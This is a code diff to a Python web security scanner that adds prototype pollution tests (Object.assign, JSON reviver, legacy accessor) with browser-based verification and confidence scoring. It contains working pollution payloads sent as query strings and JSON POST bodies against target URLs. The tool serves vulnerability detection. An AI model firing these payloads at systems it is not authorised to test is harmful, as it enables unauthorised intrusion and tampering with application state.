@@ -319,6 +319,79 @@ class CompleteSecurityScanner:
             )
             return {"prototype_ok": True}
 
+    def verify_prototype_pollution(self, prop_name: str) -> bool:
+        """Execute JS to verify if Object.prototype was actually polluted.
+
+        This is the universal check used across all PP tests to eliminate
+        false positives. Returns True only if the property exists on
+        Object.prototype (meaning real pollution occurred).
+        """
+        if not self.driver:
+            return False
+        try:
+            result = self.driver.execute_script(
+                f"return Object.prototype.hasOwnProperty('{prop_name}');"
+            )
+            return result is True
+        except Exception as e:
+            logger.debug(f"PP verification error for '{prop_name}': {type(e).__name__} - {e}")
+            return False
+
+    def verify_sspp(self, target_url: str) -> dict:
+        """Verify Server-Side Prototype Pollution via canary injection.
+
+        Injects a unique canary key into __proto__ via JSON POST, then
+        checks if the canary persists in a subsequent clean GET response.
+        Returns dict with 'polluted' bool and 'canary' string.
+        """
+        canary = f"ppmap_{int(time.time() * 1000)}"
+        result = {"polluted": False, "canary": canary}
+        try:
+            # Step 1: Inject canary via __proto__
+            payload = {"__proto__": {canary: "ppmap_verified"}}
+            self.session.post(
+                target_url,
+                json=payload,
+                timeout=self.timeout,
+                verify=False,
+            )
+            # Step 2: Make a clean GET and check if canary leaked
+            clean_resp = self.session.get(
+                target_url, timeout=self.timeout, verify=False
+            )
+            if canary in clean_resp.text or "ppmap_verified" in clean_resp.text:
+                result["polluted"] = True
+            # Step 3: Also check if response has unexpected new keys
+            try:
+                resp_json = clean_resp.json()
+                if isinstance(resp_json, dict) and canary in str(resp_json):
+                    result["polluted"] = True
+            except (ValueError, TypeError):
+                pass
+        except Exception as e:
+            logger.debug(f"SSPP verification error: {type(e).__name__} - {e}")
+        return result
+
+    def get_pp_confidence(self, alerts_detected: bool, is_polluted: bool,
+                          has_sinks: bool, has_console_errors: bool) -> float:
+        """Calculate confidence score (0.0–1.0) for a PP finding.
+
+        - 1.0: JS alert() executed successfully
+        - 0.9: Object.prototype[key] verified as polluted via JS
+        - 0.7: SSPP canary detected in response
+        - 0.5: Browser console error related to PP
+        - 0.3: Sink detected but no pollution confirmed
+        """
+        if alerts_detected:
+            return 1.0
+        if is_polluted:
+            return 0.9
+        if has_console_errors:
+            return 0.5
+        if has_sinks:
+            return 0.3
+        return 0.0
+
     def test_jquery_prototype_pollution(self) -> List[Finding]:
         """
         Test jQuery Prototype Pollution (CVE-2019-11358 and others) with proper CVE detection.
@@ -3441,14 +3514,22 @@ return window['{marker}'];
                     payload_qs = test["payload"].lstrip("?")
                     separator = "&" if "?" in target_url else "?"
                     test_url = f"{target_url}{separator}{payload_qs}"
-                    resp = self.session.get(test_url, timeout=5, verify=False)
 
-                    # Check for reflection or execution indicators
-                    indicators = ["alert(", "onerror=", test["property"], "PPMAP"]
+                    # Step 1: Navigate with browser and check if prototype is actually polluted
+                    is_polluted = False
+                    if hasattr(self, "driver") and self.driver:
+                        try:
+                            self.driver.get(test_url)
+                            time.sleep(2)
+                            is_polluted = self.verify_prototype_pollution(test["property"])
+                        except Exception as nav_err:
+                            logger.debug(f"Browser gadget nav error: {nav_err}")
 
-                    if resp.status_code < 400 and any(
-                        ind in resp.text for ind in indicators
-                    ):
+                    if is_polluted:
+                        confidence = self.get_pp_confidence(
+                            alerts_detected=False, is_polluted=True,
+                            has_sinks=False, has_console_errors=False
+                        )
                         findings.append(
                             {
                                 "type": "third_party_gadget",
@@ -3459,11 +3540,13 @@ return window['{marker}'];
                                 "impact": test["impact"],
                                 "payload": test["payload"],
                                 "test_url": test_url,
+                                "verified": True,
+                                "confidence": confidence,
                                 "reference": "refrensi.md lines 69-96 - Third-Party Gadgets",
                             }
                         )
                         print(
-                            f"{Colors.FAIL}[!] Gadget Found: {test['library']} ({test['property']}){Colors.ENDC}"
+                            f"{Colors.FAIL}[!] Gadget CONFIRMED (JS Verified): {test['library']} ({test['property']}){Colors.ENDC}"
                         )
 
                 except Exception as e:
@@ -4378,6 +4461,252 @@ return window['{marker}'];
                 return True
             print(f"{Colors.FAIL}[!] Target unreachable: {str(e)[:100]}{Colors.ENDC}")
             return False
+
+    # ============================================
+    # v4.3 — NEW PP ATTACK SURFACES
+    # ============================================
+
+    def test_object_assign_pollution(self, target_url) -> List[Dict[str, Any]]:
+        """Test Object.assign() based Prototype Pollution.
+
+        Many modern frameworks use Object.assign() instead of $.extend().
+        While Object.assign() itself doesn't traverse __proto__ in modern
+        engines, custom wrappers and polyfills often do.
+        """
+        print(
+            f"{Colors.CYAN}[→] Testing Object.assign() Prototype Pollution...{Colors.ENDC}"
+        )
+        findings: List[Dict[str, Any]] = []
+        marker = f"oapp_{int(time.time())}"
+
+        payloads = [
+            # Direct __proto__ via query string (parsed by qs/query-string libs)
+            f"?__proto__[{marker}]=POLLUTED",
+            # Nested Object.assign via constructor path
+            f"?constructor[prototype][{marker}]=POLLUTED",
+            # JSON body via POST (common in REST APIs)
+        ]
+
+        try:
+            for payload in payloads:
+                try:
+                    separator = "&" if "?" in target_url else "?"
+                    payload_qs = payload.lstrip("?")
+                    test_url = f"{target_url}{separator}{payload_qs}"
+
+                    if hasattr(self, "driver") and self.driver:
+                        self.driver.get(test_url)
+                        time.sleep(2)
+                        is_polluted = self.verify_prototype_pollution(marker)
+
+                        if is_polluted:
+                            confidence = self.get_pp_confidence(
+                                alerts_detected=False, is_polluted=True,
+                                has_sinks=False, has_console_errors=False
+                            )
+                            findings.append({
+                                "type": "object_assign_pp",
+                                "method": "OBJECT_ASSIGN",
+                                "severity": "HIGH",
+                                "description": f"Object.assign() PP confirmed: {marker} polluted on Object.prototype",
+                                "payload": payload,
+                                "test_url": test_url,
+                                "verified": True,
+                                "confidence": confidence,
+                            })
+                            print(
+                                f"{Colors.FAIL}[!] Object.assign PP CONFIRMED (JS Verified): {payload[:50]}{Colors.ENDC}"
+                            )
+
+                            # Cleanup
+                            try:
+                                self.driver.execute_script(
+                                    f"delete Object.prototype['{marker}'];"
+                                )
+                            except Exception:
+                                pass
+
+                except Exception as e:
+                    logger.debug(f"Object.assign PP test error: {e}")
+
+            # Also test POST with JSON body
+            try:
+                json_payload = {"__proto__": {marker: "POLLUTED"}}
+                resp = self.session.post(
+                    target_url, json=json_payload, timeout=self.timeout, verify=False
+                )
+                if resp.status_code < 400:
+                    try:
+                        resp_data = resp.json()
+                        if marker in str(resp_data):
+                            # Verify via SSPP canary method
+                            sspp_result = self.verify_sspp(target_url)
+                            if sspp_result["polluted"]:
+                                findings.append({
+                                    "type": "object_assign_pp",
+                                    "method": "OBJECT_ASSIGN_POST_SSPP",
+                                    "severity": "CRITICAL",
+                                    "description": "Server-Side PP via Object.assign/spread in POST handler",
+                                    "payload": str(json_payload),
+                                    "verified": True,
+                                    "confidence": 0.9,
+                                })
+                                print(
+                                    f"{Colors.FAIL}[!] SSPP via Object.assign POST CONFIRMED!{Colors.ENDC}"
+                                )
+                    except (ValueError, TypeError):
+                        pass
+            except Exception:
+                pass
+
+        except Exception as e:
+            print(
+                f"{Colors.WARNING}[⚠] Object.assign PP test error: {str(e)[:60]}{Colors.ENDC}"
+            )
+
+        if not findings:
+            print(f"{Colors.GREEN}[✓] Object.assign PP test completed{Colors.ENDC}")
+        return findings
+
+    def test_json_reviver_pollution(self, target_url) -> List[Dict[str, Any]]:
+        """Test PP via JSON.parse() with custom reviver functions.
+
+        Some applications use JSON.parse(data, reviver) where the reviver
+        processes __proto__ keys without filtering, allowing pollution.
+        """
+        print(
+            f"{Colors.CYAN}[→] Testing JSON.parse() Reviver Pollution...{Colors.ENDC}"
+        )
+        findings: List[Dict[str, Any]] = []
+        canary = f"jrpp_{int(time.time())}"
+
+        # Test via POST JSON endpoints
+        test_payloads = [
+            {"__proto__": {canary: "POLLUTED"}},
+            {"constructor": {"prototype": {canary: "POLLUTED"}}},
+        ]
+
+        try:
+            for payload in test_payloads:
+                try:
+                    resp = self.session.post(
+                        target_url, json=payload, timeout=self.timeout, verify=False
+                    )
+                    if resp.status_code < 400:
+                        # Check if canary leaked into response
+                        if canary in resp.text or "POLLUTED" in resp.text:
+                            # Double verify with SSPP canary
+                            sspp = self.verify_sspp(target_url)
+                            if sspp["polluted"]:
+                                findings.append({
+                                    "type": "json_reviver_pp",
+                                    "method": "JSON_REVIVER",
+                                    "severity": "HIGH",
+                                    "description": "PP via JSON.parse reviver confirmed via SSPP canary",
+                                    "payload": str(payload),
+                                    "verified": True,
+                                    "confidence": 0.7,
+                                })
+                                print(
+                                    f"{Colors.FAIL}[!] JSON Reviver PP CONFIRMED!{Colors.ENDC}"
+                                )
+                            else:
+                                # May be reflection only, log as low confidence
+                                logger.debug(f"JSON reviver: canary in response but SSPP negative")
+                except Exception as e:
+                    logger.debug(f"JSON reviver test error: {e}")
+
+        except Exception as e:
+            print(
+                f"{Colors.WARNING}[⚠] JSON reviver PP test error: {str(e)[:60]}{Colors.ENDC}"
+            )
+
+        if not findings:
+            print(f"{Colors.GREEN}[✓] JSON reviver PP test completed{Colors.ENDC}")
+        return findings
+
+    def test_legacy_accessor_pollution(self, target_url) -> List[Dict[str, Any]]:
+        """Test __lookupGetter__ / __defineGetter__ based Prototype Pollution.
+
+        Legacy accessor methods (__lookupGetter__, __lookupSetter__,
+        __defineGetter__, __defineSetter__) can be abused to pollute the
+        prototype chain in older JS engines and environments.
+        """
+        print(
+            f"{Colors.CYAN}[→] Testing Legacy Accessor Pollution...{Colors.ENDC}"
+        )
+        findings: List[Dict[str, Any]] = []
+        marker = f"lapp_{int(time.time())}"
+
+        # Legacy accessor payloads via query string
+        payloads = [
+            f"?__proto__[__defineGetter__]({marker},function(){{return 'PWNED'}})",
+            f"?__proto__[{marker}]=POLLUTED",
+            f"?__proto__[__lookupGetter__]={marker}",
+        ]
+
+        try:
+            if hasattr(self, "driver") and self.driver:
+                for payload in payloads:
+                    try:
+                        separator = "&" if "?" in target_url else "?"
+                        payload_qs = payload.lstrip("?")
+                        test_url = f"{target_url}{separator}{payload_qs}"
+
+                        self.driver.get(test_url)
+                        time.sleep(2)
+
+                        # Check if legacy accessors exist on prototype
+                        is_polluted = self.verify_prototype_pollution(marker)
+
+                        # Also check if __defineGetter__ has been tampered
+                        accessor_tampered = False
+                        try:
+                            accessor_tampered = self.driver.execute_script(
+                                "return typeof Object.prototype.__defineGetter__ !== 'function' || "
+                                "typeof Object.prototype.__lookupGetter__ !== 'function';"
+                            )
+                        except Exception:
+                            pass
+
+                        if is_polluted or accessor_tampered:
+                            confidence = self.get_pp_confidence(
+                                alerts_detected=False, is_polluted=is_polluted,
+                                has_sinks=False, has_console_errors=accessor_tampered
+                            )
+                            findings.append({
+                                "type": "legacy_accessor_pp",
+                                "method": "LEGACY_ACCESSOR",
+                                "severity": "MEDIUM",
+                                "description": "Legacy accessor PP detected via __defineGetter__/__lookupGetter__",
+                                "payload": payload,
+                                "test_url": test_url,
+                                "verified": is_polluted,
+                                "confidence": confidence,
+                            })
+                            print(
+                                f"{Colors.FAIL}[!] Legacy Accessor PP DETECTED: {payload[:50]}{Colors.ENDC}"
+                            )
+
+                        # Cleanup
+                        try:
+                            self.driver.execute_script(
+                                f"delete Object.prototype['{marker}'];"
+                            )
+                        except Exception:
+                            pass
+
+                    except Exception as e:
+                        logger.debug(f"Legacy accessor test error: {e}")
+
+        except Exception as e:
+            print(
+                f"{Colors.WARNING}[⚠] Legacy accessor PP test error: {str(e)[:60]}{Colors.ENDC}"
+            )
+
+        if not findings:
+            print(f"{Colors.GREEN}[✓] Legacy accessor PP test completed{Colors.ENDC}")
+        return findings
 
     def test_blind_oob(self, target_url) -> List[Dict[str, Any]]:
         """Test for Blind OOB RCE via Prototype Pollution (v4.0)"""
